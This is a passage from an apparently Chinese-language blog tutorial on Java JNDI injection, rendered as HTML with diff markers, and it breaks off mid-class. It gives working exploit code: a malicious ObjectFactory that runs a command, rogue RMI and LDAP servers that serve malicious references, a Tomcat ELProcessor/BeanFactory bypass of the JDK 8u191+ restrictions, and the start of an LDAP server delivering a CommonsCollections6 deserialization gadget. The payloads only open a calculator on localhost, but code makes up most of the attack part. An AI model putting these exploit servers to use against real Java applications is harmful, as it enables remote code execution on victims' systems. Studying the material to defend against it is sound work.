+<span class="kd">public</span> <span class="kd">class</span> <span class="nc">test</span> <span class="kd">implements</span> <span class="n">ObjectFactory</span> <span class="o">{</span>
+ <span class="kd">public</span> <span class="n">Object</span> <span class="nf">getObjectInstance</span><span class="o">(</span><span class="n">Object</span> <span class="n">obj</span><span class="o">,</span> <span class="n">Name</span> <span class="n">name</span><span class="o">,</span> <span class="n">Context</span> <span class="n">ctx</span><span class="o">,</span> <span class="n">Hashtable</span><span class="o">&lt;?,</span> <span class="o">?&gt;</span> <span class="n">env</span><span class="o">)</span> <span class="kd">throws</span> <span class="n">Exception</span> <span class="o">{</span>
+       <span class="c1">//在创建对象过程中插入恶意的攻击代码
+</span><span class="c1"></span>        <span class="k">return</span> <span class="n">Runtime</span><span class="o">.</span><span class="na">getRuntime</span><span class="o">().</span><span class="na">exec</span><span class="o">(</span><span class="s">&#34;calc&#34;</span><span class="o">);</span>
+    <span class="o">}</span>
+<span class="o">}</span>
+</code></pre></td></tr></table></div>
+</div>
+</div></li>
+<li>
+<p>客户端发起请求</p>
+<div class="highlight"><div class="chroma">
+<div class="table-container"><table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
+</span><span class="lnt"> 2
+</span><span class="lnt"> 3
+</span><span class="lnt"> 4
+</span><span class="lnt"> 5
+</span><span class="lnt"> 6
+</span><span class="lnt"> 7
+</span><span class="lnt"> 8
+</span><span class="lnt"> 9
+</span><span class="lnt">10
+</span><span class="lnt">11
+</span><span class="lnt">12
+</span><span class="lnt">13
+</span><span class="lnt">14
+</span><span class="lnt">15
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-java" data-lang="java"><span class="kn">package</span> <span class="nn">jndi</span><span class="o">;</span>
+
+<span class="kn">import</span> <span class="nn">javax.naming.InitialContext</span><span class="o">;</span>
+
+<span class="kd">public</span> <span class="kd">class</span> <span class="nc">client</span> <span class="o">{</span>
+    <span class="kd">public</span> <span class="kd">static</span> <span class="kt">void</span> <span class="nf">main</span><span class="o">(</span><span class="n">String</span><span class="o">[]</span> <span class="n">args</span><span class="o">)</span> <span class="o">{</span>
+        <span class="k">try</span><span class="o">{</span>
+            <span class="n">String</span> <span class="n">url</span> <span class="o">=</span> <span class="s">&#34;rmi://localhost:1099/obj&#34;</span><span class="o">;</span>
+            <span class="n">InitialContext</span> <span class="n">initialContext</span> <span class="o">=</span> <span class="k">new</span> <span class="n">InitialContext</span><span class="o">();</span>
+            <span class="n">initialContext</span><span class="o">.</span><span class="na">lookup</span><span class="o">(</span><span class="n">url</span><span class="o">);</span>
+        <span class="o">}</span><span class="k">catch</span> <span class="o">(</span><span class="n">Exception</span> <span class="n">e</span><span class="o">){</span>
+            <span class="n">e</span><span class="o">.</span><span class="na">printStackTrace</span><span class="o">();</span>
+        <span class="o">}</span>
+    <span class="o">}</span>
+<span class="o">}</span>
+</code></pre></td></tr></table></div>
+</div>
+</div></li>
+</ul>
+<h3 id="jndi--ldap"><a href="#jndi--ldap" class="anchor-link">#</a><a href="#contents:jndi--ldap" class="headings">JNDI + LDAP</a></h3>
+<p>LDAP和RMI道理差不多。LDAP服务端程序会在收到LDAP请求后返回一个含有恶意攻击代码的对象工厂的远程class地址。客户端会加载构建的恶意对象工厂(ReferenceObjectFactory)类然后调用其中的<code>getObjectInstance</code>方法从而触发该方法中的恶意RCE代码。</p>
+<ul>
+<li>
+<p>服务端实现</p>
+<div class="highlight"><div class="chroma">
+<div class="table-container"><table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span><span class="lnt">2
+</span><span class="lnt">3
+</span><span class="lnt">4
+</span><span class="lnt">5
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-xml" data-lang="xml"><span class="nt">&lt;dependency&gt;</span>
+        <span class="nt">&lt;groupId&gt;</span>com.unboundid<span class="nt">&lt;/groupId&gt;</span>
+        <span class="nt">&lt;artifactId&gt;</span>unboundid-ldapsdk<span class="nt">&lt;/artifactId&gt;</span>
+        <span class="nt">&lt;version&gt;</span>3.1.0<span class="nt">&lt;/version&gt;</span>
+<span class="nt">&lt;/dependency&gt;</span>
+</code></pre></td></tr></table></div>
+</div>
+</div><div class="highlight"><div class="chroma">
+<div class="table-container"><table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
+</span><span class="lnt"> 2
+</span><span class="lnt"> 3
+</span><span class="lnt"> 4
+</span><span class="lnt"> 5
+</span><span class="lnt"> 6
+</span><span class="lnt"> 7
+</span><span class="lnt"> 8
+</span><span class="lnt"> 9
+</span><span class="lnt">10
+</span><span class="lnt">11
+</span><span class="lnt">12
+</span><span class="lnt">13
+</span><span class="lnt">14
+</span><span class="lnt">15
+</span><span class="lnt">16
+</span><span class="lnt">17
+</span><span class="lnt">18
+</span><span class="lnt">19
+</span><span class="lnt">20
+</span><span class="lnt">21
+</span><span class="lnt">22
+</span><span class="lnt">23
+</span><span class="lnt">24
+</span><span class="lnt">25
+</span><span class="lnt">26
+</span><span class="lnt">27
+</span><span class="lnt">28
+</span><span class="lnt">29
+</span><span class="lnt">30
+</span><span class="lnt">31
+</span><span class="lnt">32
+</span><span class="lnt">33
+</span><span class="lnt">34
+</span><span class="lnt">35
+</span><span class="lnt">36
+</span><span class="lnt">37
+</span><span class="lnt">38
+</span><span class="lnt">39
+</span><span class="lnt">40
+</span><span class="lnt">41
+</span><span class="lnt">42
+</span><span class="lnt">43
+</span><span class="lnt">44
+</span><span class="lnt">45
+</span><span class="lnt">46
+</span><span class="lnt">47
+</span><span class="lnt">48
+</span><span class="lnt">49
+</span><span class="lnt">50
+</span><span class="lnt">51
+</span><span class="lnt">52
+</span><span class="lnt">53
+</span><span class="lnt">54
+</span><span class="lnt">55
+</span><span class="lnt">56
+</span><span class="lnt">57
+</span><span class="lnt">58
+</span><span class="lnt">59
+</span><span class="lnt">60
+</span><span class="lnt">61
+</span><span class="lnt">62
+</span><span class="lnt">63
+</span><span class="lnt">64
+</span><span class="lnt">65
+</span><span class="lnt">66
+</span><span class="lnt">67
+</span><span class="lnt">68
+</span><span class="lnt">69
+</span><span class="lnt">70
+</span><span class="lnt">71
+</span><span class="lnt">72
+</span><span class="lnt">73
+</span><span class="lnt">74
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-java" data-lang="java"><span class="kn">package</span> <span class="nn">jndi</span><span class="o">;</span>
+
+<span class="kn">import</span> <span class="nn">com.unboundid.ldap.listener.InMemoryDirectoryServer</span><span class="o">;</span>
+<span class="kn">import</span> <span class="nn">com.unboundid.ldap.listener.InMemoryDirectoryServerConfig</span><span class="o">;</span>
+<span class="kn">import</span> <span class="nn">com.unboundid.ldap.listener.InMemoryListenerConfig</span><span class="o">;</span>
+<span class="kn">import</span> <span class="nn">com.unboundid.ldap.listener.interceptor.InMemoryInterceptedSearchResult</span><span class="o">;</span>
+<span class="kn">import</span> <span class="nn">com.unboundid.ldap.listener.interceptor.InMemoryOperationInterceptor</span><span class="o">;</span>
+<span class="kn">import</span> <span class="nn">com.unboundid.ldap.sdk.Entry</span><span class="o">;</span>
+<span class="kn">import</span> <span class="nn">com.unboundid.ldap.sdk.LDAPResult</span><span class="o">;</span>
+<span class="kn">import</span> <span class="nn">com.unboundid.ldap.sdk.ResultCode</span><span class="o">;</span>
+
+<span class="kn">import</span> <span class="nn">javax.net.ServerSocketFactory</span><span class="o">;</span>
+<span class="kn">import</span> <span class="nn">javax.net.SocketFactory</span><span class="o">;</span>
+<span class="kn">import</span> <span class="nn">javax.net.ssl.SSLSocketFactory</span><span class="o">;</span>
+<span class="kn">import</span> <span class="nn">java.net.InetAddress</span><span class="o">;</span>
+
+<span class="kd">public</span> <span class="kd">class</span> <span class="nc">ldapserver</span> <span class="o">{</span>
+
+    <span class="c1">// 设置LDAP绑定的服务地址，外网测试换成0.0.0.0
+</span><span class="c1"></span>    <span class="kd">public</span> <span class="kd">static</span> <span class="kd">final</span> <span class="n">String</span> <span class="n">BIND_HOST</span> <span class="o">=</span> <span class="s">&#34;127.0.0.1&#34;</span><span class="o">;</span>
+    <span class="c1">// 设置LDAP服务端口
+</span><span class="c1"></span>    <span class="kd">public</span> <span class="kd">static</span> <span class="kd">final</span> <span class="kt">int</span> <span class="n">SERVER_PORT</span> <span class="o">=</span> <span class="n">3890</span><span class="o">;</span>
+
+    <span class="kd">public</span> <span class="kd">static</span> <span class="kt">void</span> <span class="nf">main</span><span class="o">(</span><span class="n">String</span><span class="o">[]</span> <span class="n">args</span><span class="o">)</span> <span class="o">{</span>
+        <span class="k">try</span> <span class="o">{</span>
+            <span class="c1">// 创建LDAP配置对象
+</span><span class="c1"></span>            <span class="n">InMemoryDirectoryServerConfig</span> <span class="n">config</span> <span class="o">=</span> <span class="k">new</span> <span class="n">InMemoryDirectoryServerConfig</span><span class="o">(</span><span class="s">&#34;dc=test,dc=org&#34;</span><span class="o">);</span>
+            <span class="c1">// 设置LDAP监听配置信息
+</span><span class="c1"></span>            <span class="n">config</span><span class="o">.</span><span class="na">setListenerConfigs</span><span class="o">(</span><span class="k">new</span> <span class="n">InMemoryListenerConfig</span><span class="o">(</span>
+                    <span class="s">&#34;listen&#34;</span><span class="o">,</span> <span class="n">InetAddress</span><span class="o">.</span><span class="na">getByName</span><span class="o">(</span><span class="n">BIND_HOST</span><span class="o">),</span> <span class="n">SERVER_PORT</span><span class="o">,</span>
+                    <span class="n">ServerSocketFactory</span><span class="o">.</span><span class="na">getDefault</span><span class="o">(),</span> <span class="n">SocketFactory</span><span class="o">.</span><span class="na">getDefault</span><span class="o">(),</span>
+                    <span class="o">(</span><span class="n">SSLSocketFactory</span><span class="o">)</span> <span class="n">SSLSocketFactory</span><span class="o">.</span><span class="na">getDefault</span><span class="o">())</span>
+            <span class="o">);</span>
+            <span class="c1">// 添加自定义的LDAP操作拦截器
+</span><span class="c1"></span>            <span class="n">config</span><span class="o">.</span><span class="na">addInMemoryOperationInterceptor</span><span class="o">(</span><span class="k">new</span> <span class="n">OperationInterceptor</span><span class="o">());</span>
+
+            <span class="c1">// 创建LDAP服务对象
+</span><span class="c1"></span>            <span class="n">InMemoryDirectoryServer</span> <span class="n">ds</span> <span class="o">=</span> <span class="k">new</span> <span class="n">InMemoryDirectoryServer</span><span class="o">(</span><span class="n">config</span><span class="o">);</span>
+            <span class="c1">// 启动服务
+</span><span class="c1"></span>            <span class="n">ds</span><span class="o">.</span><span class="na">startListening</span><span class="o">();</span>
+            <span class="n">System</span><span class="o">.</span><span class="na">out</span><span class="o">.</span><span class="na">println</span><span class="o">(</span><span class="s">&#34;LDAP服务启动成功&#34;</span><span class="o">);</span>
+        <span class="o">}</span><span class="k">catch</span> <span class="o">(</span><span class="n">Exception</span> <span class="n">e</span><span class="o">){</span>
+            <span class="n">e</span><span class="o">.</span><span class="na">printStackTrace</span><span class="o">();</span>
+        <span class="o">}</span>
+
+    <span class="o">}</span>
+    <span class="kd">private</span> <span class="kd">static</span> <span class="kd">class</span> <span class="nc">OperationInterceptor</span> <span class="kd">extends</span> <span class="n">InMemoryOperationInterceptor</span> <span class="o">{</span>
+
+        <span class="nd">@Override</span>
+        <span class="kd">public</span> <span class="kt">void</span> <span class="nf">processSearchResult</span><span class="o">(</span><span class="n">InMemoryInterceptedSearchResult</span> <span class="n">result</span><span class="o">)</span> <span class="o">{</span>
+            <span class="n">String</span> <span class="n">base</span>  <span class="o">=</span> <span class="n">result</span><span class="o">.</span><span class="na">getRequest</span><span class="o">().</span><span class="na">getBaseDN</span><span class="o">();</span>
+            <span class="n">Entry</span>  <span class="n">entry</span> <span class="o">=</span> <span class="k">new</span> <span class="n">Entry</span><span class="o">(</span><span class="n">base</span><span class="o">);</span>
+
+            <span class="k">try</span> <span class="o">{</span>
+                <span class="c1">// 设置对象的工厂类名
+</span><span class="c1"></span>                <span class="n">String</span> <span class="n">className</span> <span class="o">=</span> <span class="s">&#34;test&#34;</span><span class="o">;</span> <span class="c1">//修改
+</span><span class="c1"></span>                <span class="n">entry</span><span class="o">.</span><span class="na">addAttribute</span><span class="o">(</span><span class="s">&#34;javaClassName&#34;</span><span class="o">,</span> <span class="n">className</span><span class="o">);</span>
+                <span class="n">entry</span><span class="o">.</span><span class="na">addAttribute</span><span class="o">(</span><span class="s">&#34;javaFactory&#34;</span><span class="o">,</span> <span class="n">className</span><span class="o">);</span>
+
+                <span class="c1">// 设置远程的恶意引用对象的jar地址
+</span><span class="c1"></span>                <span class="n">entry</span><span class="o">.</span><span class="na">addAttribute</span><span class="o">(</span><span class="s">&#34;javaCodeBase&#34;</span><span class="o">,</span> <span class="s">&#34;&lt;http://127.0.0.1:8080/&gt;&#34;</span><span class="o">);</span>
+
+                <span class="c1">// 设置LDAP objectClass
+</span><span class="c1"></span>                <span class="n">entry</span><span class="o">.</span><span class="na">addAttribute</span><span class="o">(</span><span class="s">&#34;objectClass&#34;</span><span class="o">,</span> <span class="s">&#34;javaNamingReference&#34;</span><span class="o">);</span>
+
+                <span class="n">result</span><span class="o">.</span><span class="na">sendSearchEntry</span><span class="o">(</span><span class="n">entry</span><span class="o">);</span>
+                <span class="n">result</span><span class="o">.</span><span class="na">setResult</span><span class="o">(</span><span class="k">new</span> <span class="n">LDAPResult</span><span class="o">(</span><span class="n">0</span><span class="o">,</span> <span class="n">ResultCode</span><span class="o">.</span><span class="na">SUCCESS</span><span class="o">));</span>
+            <span class="o">}</span> <span class="k">catch</span> <span class="o">(</span><span class="n">Exception</span> <span class="n">e1</span><span class="o">)</span> <span class="o">{</span>
+                <span class="n">e1</span><span class="o">.</span><span class="na">printStackTrace</span><span class="o">();</span>
+            <span class="o">}</span>
+        <span class="o">}</span>
+
+    <span class="o">}</span>
+<span class="o">}</span>
+</code></pre></td></tr></table></div>
+</div>
+</div></li>
+<li>
+<p>客户端实现</p>
+<div class="highlight"><div class="chroma">
+<div class="table-container"><table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
+</span><span class="lnt"> 2
+</span><span class="lnt"> 3
+</span><span class="lnt"> 4
+</span><span class="lnt"> 5
+</span><span class="lnt"> 6
+</span><span class="lnt"> 7
+</span><span class="lnt"> 8
+</span><span class="lnt"> 9
+</span><span class="lnt">10
+</span><span class="lnt">11
+</span><span class="lnt">12
+</span><span class="lnt">13
+</span><span class="lnt">14
+</span><span class="lnt">15
+</span><span class="lnt">16
+</span><span class="lnt">17
+</span><span class="lnt">18
+</span><span class="lnt">19
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-java" data-lang="java"><span class="kn">package</span> <span class="nn">jndi</span><span class="o">;</span>
+
+<span class="kn">import</span> <span class="nn">javax.naming.InitialContext</span><span class="o">;</span>
+
+<span class="kd">public</span> <span class="kd">class</span> <span class="nc">client</span> <span class="o">{</span>
+    <span class="kd">public</span> <span class="kd">static</span> <span class="kt">void</span> <span class="nf">main</span><span class="o">(</span><span class="n">String</span><span class="o">[]</span> <span class="n">args</span><span class="o">)</span> <span class="o">{</span>
+        <span class="cm">/*
+</span><span class="cm">        System.setProperty(&#34;java.rmi.server.useCodebaseOnly&#34;, &#34;false&#34;);
+</span><span class="cm">        System.setProperty(&#34;com.sun.jndi.rmi.object.trustURLCodebase&#34;, &#34;true&#34;);*/</span>
+        <span class="k">try</span><span class="o">{</span>
+            <span class="n">String</span> <span class="n">url</span> <span class="o">=</span> <span class="s">&#34;ldap://localhost:3890/test&#34;</span><span class="o">;</span>
+            <span class="n">InitialContext</span> <span class="n">initialContext</span> <span class="o">=</span> <span class="k">new</span> <span class="n">InitialContext</span><span class="o">();</span>
+            <span class="n">Object</span> <span class="n">obj</span> <span class="o">=</span><span class="n">initialContext</span><span class="o">.</span><span class="na">lookup</span><span class="o">(</span><span class="n">url</span><span class="o">);</span>
+            <span class="n">System</span><span class="o">.</span><span class="na">out</span><span class="o">.</span><span class="na">println</span><span class="o">(</span><span class="n">obj</span><span class="o">);</span>
+        <span class="o">}</span><span class="k">catch</span> <span class="o">(</span><span class="n">Exception</span> <span class="n">e</span><span class="o">){</span>
+            <span class="n">e</span><span class="o">.</span><span class="na">printStackTrace</span><span class="o">();</span>
+        <span class="o">}</span>
+    <span class="o">}</span>
+<span class="o">}</span>
+</code></pre></td></tr></table></div>
+</div>
+</div></li>
+</ul>
+<p>执行命令的类不变，还是RMI部分介绍的<code>test.class</code>。</p>
+<p><code>com.sun.jndi.ldap.object.trustURLCodebase</code>属性的值被调整为false，LDAP就没法进行利用。</p>
+<h2 id="绕过jdk-8u191高版本限制"><a href="#绕过jdk-8u191高版本限制" class="anchor-link">#</a><a href="#contents:绕过jdk-8u191高版本限制" class="headings">绕过JDK 8u191+高版本限制</a></h2>
+<p>对于<code>JDK6u211、7u201、8u191、11.0.1</code>或者更高版本的JDK来说，默认环境下之前介绍的利用方式都已经失效。两种绕过方法如下:</p>
+<ol>
+<li>找到一个受害者本地CLASSPATH中的类作为恶意的Reference Factory工厂类，并利用这个本地的Factory类执行命令。</li>
+<li>利用LDAP直接返回一个恶意的序列化对象，JNDI注入依然会对该对象进行反序列化操作，利用反序列化Gadget完成命令执行。</li>
+</ol>
+<p>这两种方式都依赖受害者本地CLASSPATH中的环境，需要利用受害者本地的Gadget进行攻击。</p>
+<h3 id="利用elprocessor"><a href="#利用elprocessor" class="anchor-link">#</a><a href="#contents:利用elprocessor" class="headings">利用ELProcessor</a></h3>
+<p>可以利用ELProcessor作为Reference Factory，但由于依赖javax.el.ELProcessor这个类，所以需要目标环境 ≥ tomcat8。（可被利用的Spring Boot Web Starter版本应在1.2.x及以上，因为1.1.x及1.0.x内置的是Tomcat7）</p>
+<p>测试了<code>jdk 8u301、jdk11、jdk15</code>可以正常利用。</p>
+<p>Server端代码</p>
+<div class="highlight"><div class="chroma">
+<div class="table-container"><table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
+</span><span class="lnt"> 2
+</span><span class="lnt"> 3
+</span><span class="lnt"> 4
+</span><span class="lnt"> 5
+</span><span class="lnt"> 6
+</span><span class="lnt"> 7
+</span><span class="lnt"> 8
+</span><span class="lnt"> 9
+</span><span class="lnt">10
+</span><span class="lnt">11
+</span><span class="lnt">12
+</span><span class="lnt">13
+</span><span class="lnt">14
+</span><span class="lnt">15
+</span><span class="lnt">16
+</span><span class="lnt">17
+</span><span class="lnt">18
+</span><span class="lnt">19
+</span><span class="lnt">20
+</span><span class="lnt">21
+</span><span class="lnt">22
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-java" data-lang="java"><span class="kn">package</span> <span class="nn">rmi</span><span class="o">;</span>
+
+<span class="kn">import</span> <span class="nn">com.sun.jndi.rmi.registry.ReferenceWrapper</span><span class="o">;</span>
+<span class="kn">import</span> <span class="nn">java.rmi.registry.LocateRegistry</span><span class="o">;</span>
+<span class="kn">import</span> <span class="nn">java.rmi.registry.Registry</span><span class="o">;</span>
+<span class="kn">import</span> <span class="nn">javax.naming.StringRefAddr</span><span class="o">;</span>
+<span class="kn">import</span> <span class="nn">org.apache.naming.ResourceRef</span><span class="o">;</span>
+<span class="kd">public</span> <span class="kd">class</span> <span class="nc">server</span> <span class="o">{</span>
+    <span class="kd">public</span> <span class="kd">static</span> <span class="kt">void</span> <span class="nf">main</span><span class="o">(</span><span class="n">String</span><span class="o">[]</span> <span class="n">args</span><span class="o">)</span> <span class="o">{</span>
+        <span class="k">try</span> <span class="o">{</span>
+            <span class="n">Registry</span> <span class="n">registry</span> <span class="o">=</span> <span class="n">LocateRegistry</span><span class="o">.</span><span class="na">createRegistry</span><span class="o">(</span><span class="n">1098</span><span class="o">);</span>
+            <span class="n">ResourceRef</span> <span class="n">resourceRef</span> <span class="o">=</span> <span class="k">new</span> <span class="n">ResourceRef</span><span class="o">(</span><span class="s">&#34;javax.el.ELProcessor&#34;</span><span class="o">,</span> <span class="o">(</span><span class="n">String</span><span class="o">)</span><span class="kc">null</span><span class="o">,</span> <span class="s">&#34;&#34;</span><span class="o">,</span> <span class="s">&#34;&#34;</span><span class="o">,</span> <span class="kc">true</span><span class="o">,</span> <span class="s">&#34;org.apache.naming.factory.BeanFactory&#34;</span><span class="o">,</span> <span class="o">(</span><span class="n">String</span><span class="o">)</span><span class="kc">null</span><span class="o">);</span>
+            <span class="n">resourceRef</span><span class="o">.</span><span class="na">add</span><span class="o">(</span><span class="k">new</span> <span class="n">StringRefAddr</span><span class="o">(</span><span class="s">&#34;forceString&#34;</span><span class="o">,</span> <span class="s">&#34;a=eval&#34;</span><span class="o">));</span>
+            <span class="n">resourceRef</span><span class="o">.</span><span class="na">add</span><span class="o">(</span><span class="k">new</span> <span class="n">StringRefAddr</span><span class="o">(</span><span class="s">&#34;a&#34;</span><span class="o">,</span> <span class="s">&#34;Runtime.getRuntime().exec(\&#34;open /System/Applications/Calculator.app\&#34;)&#34;</span><span class="o">));</span>
+						<span class="c1">//触发点在resourceRef的getObjectInstance()方法中
+</span><span class="c1"></span>            <span class="n">ReferenceWrapper</span> <span class="n">referenceWrapper</span> <span class="o">=</span> <span class="k">new</span> <span class="n">ReferenceWrapper</span><span class="o">(</span><span class="n">resourceRef</span><span class="o">);</span>
+            <span class="n">registry</span><span class="o">.</span><span class="na">bind</span><span class="o">(</span><span class="s">&#34;Exploit&#34;</span><span class="o">,</span> <span class="n">referenceWrapper</span><span class="o">);</span>
+        <span class="o">}</span> <span class="k">catch</span> <span class="o">(</span><span class="n">Exception</span> <span class="n">e</span><span class="o">)</span> <span class="o">{</span>
+            <span class="n">e</span><span class="o">.</span><span class="na">printStackTrace</span><span class="o">();</span>
+        <span class="o">}</span>
+    <span class="o">}</span>
+<span class="o">}</span>
+</code></pre></td></tr></table></div>
+</div>
+</div><p>相当于调用了: <code>new javax.el.ELProcessor().eval(&quot;Runtime.getRuntime().exec(\&quot;open /System/Applications/Calculator.app\&quot;)&quot;);</code></p>
+<h3 id="利用ldap反序列化数据"><a href="#利用ldap反序列化数据" class="anchor-link">#</a><a href="#contents:利用ldap反序列化数据" class="headings">利用LDAP反序列化数据</a></h3>
+<p>LDAP Server除了使用JNDI Reference进行利用之外，还可以直接返回一个对象的序列化数据。如果Java对象的javaSerializedData属性值不为空，则客户端的obj.decodeObject()方法就会对这个字段的内容进行反序列化。</p>
+<ul>
+<li>
+<p>ldap Server （这里利用的CommonsCollections 6）</p>
+<div class="highlight"><div class="chroma">
+<div class="table-container"><table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
+</span><span class="lnt"> 2
+</span><span class="lnt"> 3
+</span><span class="lnt"> 4
+</span><span class="lnt"> 5
+</span><span class="lnt"> 6
+</span><span class="lnt"> 7
+</span><span class="lnt"> 8
+</span><span class="lnt"> 9
+</span><span class="lnt">10
+</span><span class="lnt">11
+</span><span class="lnt">12
+</span><span class="lnt">13
+</span><span class="lnt">14
+</span><span class="lnt">15
+</span><span class="lnt">16
+</span><span class="lnt">17
+</span><span class="lnt">18
+</span><span class="lnt">19
+</span><span class="lnt">20
+</span><span class="lnt">21
+</span><span class="lnt">22
+</span><span class="lnt">23
+</span><span class="lnt">24
+</span><span class="lnt">25
+</span><span class="lnt">26
+</span><span class="lnt">27
+</span><span class="lnt">28
+</span><span class="lnt">29
+</span><span class="lnt">30
+</span><span class="lnt">31
+</span><span class="lnt">32
+</span><span class="lnt">33
+</span><span class="lnt">34
+</span><span class="lnt">35
+</span><span class="lnt">36
+</span><span class="lnt">37
+</span><span class="lnt">38
+</span><span class="lnt">39
+</span><span class="lnt">40
+</span><span class="lnt">41
+</span><span class="lnt">42
+</span><span class="lnt">43
+</span><span class="lnt">44
+</span><span class="lnt">45
+</span><span class="lnt">46
+</span><span class="lnt">47
+</span><span class="lnt">48
+</span><span class="lnt">49
+</span><span class="lnt">50
+</span><span class="lnt">51
+</span><span class="lnt">52
+</span><span class="lnt">53
+</span><span class="lnt">54
+</span><span class="lnt">55
+</span><span class="lnt">56
+</span><span class="lnt">57
+</span><span class="lnt">58
+</span><span class="lnt">59
+</span><span class="lnt">60
+</span><span class="lnt">61
+</span><span class="lnt">62
+</span><span class="lnt">63
+</span><span class="lnt">64
+</span><span class="lnt">65
+</span><span class="lnt">66
+</span><span class="lnt">67
+</span><span class="lnt">68
+</span><span class="lnt">69
+</span><span class="lnt">70
+</span><span class="lnt">71
+</span><span class="lnt">72
+</span><span class="lnt">73
+</span><span class="lnt">74
+</span><span class="lnt">75
+</span><span class="lnt">76
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-java" data-lang="java"><span class="kn">package</span> <span class="nn">rmiserver</span><span class="o">;</span>
+<span class="kn">import</span> <span class="nn">com.unboundid.ldap.listener.InMemoryDirectoryServer</span><span class="o">;</span>
+<span class="kn">import</span> <span class="nn">com.unboundid.ldap.listener.InMemoryDirectoryServerConfig</span><span class="o">;</span>
+<span class="kn">import</span> <span class="nn">com.unboundid.ldap.listener.InMemoryListenerConfig</span><span class="o">;</span>
+<span class="kn">import</span> <span class="nn">com.unboundid.ldap.listener.interceptor.InMemoryInterceptedSearchResult</span><span class="o">;</span>
+<span class="kn">import</span> <span class="nn">com.unboundid.ldap.listener.interceptor.InMemoryOperationInterceptor</span><span class="o">;</span>
+<span class="kn">import</span> <span class="nn">com.unboundid.ldap.sdk.Entry</span><span class="o">;</span>
+<span class="kn">import</span> <span class="nn">com.unboundid.ldap.sdk.LDAPException</span><span class="o">;</span>
+<span class="kn">import</span> <span class="nn">com.unboundid.ldap.sdk.LDAPResult</span><span class="o">;</span>
+<span class="kn">import</span> <span class="nn">com.unboundid.ldap.sdk.ResultCode</span><span class="o">;</span>
+<span class="kn">import</span> <span class="nn">com.unboundid.util.Base64</span><span class="o">;</span>
+
+<span class="kn">import</span> <span class="nn">javax.net.ServerSocketFactory</span><span class="o">;</span>
+<span class="kn">import</span> <span class="nn">javax.net.SocketFactory</span><span class="o">;</span>
+<span class="kn">import</span> <span class="nn">javax.net.ssl.SSLSocketFactory</span><span class="o">;</span>
+<span class="kn">import</span> <span class="nn">java.net.InetAddress</span><span class="o">;</span>
+<span class="kn">import</span> <span class="nn">java.net.MalformedURLException</span><span class="o">;</span>
+<span class="kn">import</span> <span class="nn">java.text.ParseException</span><span class="o">;</span>
+
+
+<span class="kd">public</span> <span class="kd">class</span> <span class="nc">ldap_server</span> <span class="o">{</span>
+
+    <span class="kd">private</span> <span class="kd">static</span> <span class="kd">final</span> <span class="n">String</span> <span class="n">LDAP_BASE</span> <span class="o">=</span> <span class="s">&#34;dc=example,dc=com&#34;</span><span class="o">;</span>
+    <span class="kd">public</span> <span class="kd">static</span> <span class="kt">void</span> <span class="nf">main</span> <span class="o">(</span><span class="n">String</span><span class="o">[]</span> <span class="n">args</span><span class="o">)</span> <span class="o">{</span>
+        <span class="kt">int</span> <span class="n">port</span> <span class="o">=</span> <span class="n">1389</span><span class="o">;</span>
+        <span class="k">try</span> <span class="o">{</span>
+            <span class="n">InMemoryDirectoryServerConfig</span> <span class="n">config</span> <span class="o">=</span> <span class="k">new</span> <span class="n">InMemoryDirectoryServerConfig</span><span class="o">(</span><span class="n">LDAP_BASE</span><span class="o">);</span>
+            <span class="n">config</span><span class="o">.</span><span class="na">setListenerConfigs</span><span class="o">(</span><span class="k">new</span> <span class="n">InMemoryListenerConfig</span><span class="o">(</span>
+                    <span class="s">&#34;listen&#34;</span><span class="o">,</span>
+                    <span class="n">InetAddress</span><span class="o">.</span><span class="na">getByName</span><span class="o">(</span><span class="s">&#34;0.0.0.0&#34;</span><span class="o">),</span>
+                    <span class="n">port</span><span class="o">,</span>
+                    <span class="n">ServerSocketFactory</span><span class="o">.</span><span class="na">getDefault</span><span class="o">(),</span>
+                    <span class="n">SocketFactory</span><span class="o">.</span><span class="na">getDefault</span><span class="o">(),</span>
+                    <span class="o">(</span><span class="n">SSLSocketFactory</span><span class="o">)</span> <span class="n">SSLSocketFactory</span><span class="o">.</span><span class="na">getDefault</span><span class="o">()));</span>
+
+            <span class="n">config</span><span class="o">.</span><span class="na">addInMemoryOperationInterceptor</span><span class="o">(</span><span class="k">new</span> <span class="n">OperationInterceptor</span><span class="o">());</span>
+            <span class="n">InMemoryDirectoryServer</span> <span class="n">ds</span> <span class="o">=</span> <span class="k">new</span> <span class="n">InMemoryDirectoryServer</span><span class="o">(</span><span class="n">config</span><span class="o">);</span>
+            <span class="n">System</span><span class="o">.</span><span class="na">out</span><span class="o">.</span><span class="na">println</span><span class="o">(</span><span class="s">&#34;Listening on 0.0.0.0:&#34;</span> <span class="o">+</span> <span class="n">port</span><span class="o">);</span>
+            <span class="n">ds</span><span class="o">.</span><span class="na">startListening</span><span class="o">();</span>
+
+        <span class="o">}</span>
+        <span class="k">catch</span> <span class="o">(</span> <span class="n">Exception</span> <span class="n">e</span> <span class="o">)</span> <span class="o">{</span>
+            <span class="n">e</span><span class="o">.</span><span class="na">printStackTrace</span><span class="o">();</span>
+        <span class="o">}</span>
+    <span class="o">}</span>
+
+    <span class="kd">private</span> <span class="kd">static</span> <span class="kd">class</span> <span class="nc">OperationInterceptor</span> <span class="kd">extends</span> <span class="n">InMemoryOperationInterceptor</span> <span class="o">{</span>
+        <span class="kd">public</span> <span class="nf">OperationInterceptor</span> <span class="o">()</span> <span class="o">{</span>
+        <span class="o">}</span>
+
+        <span class="nd">@Override</span>
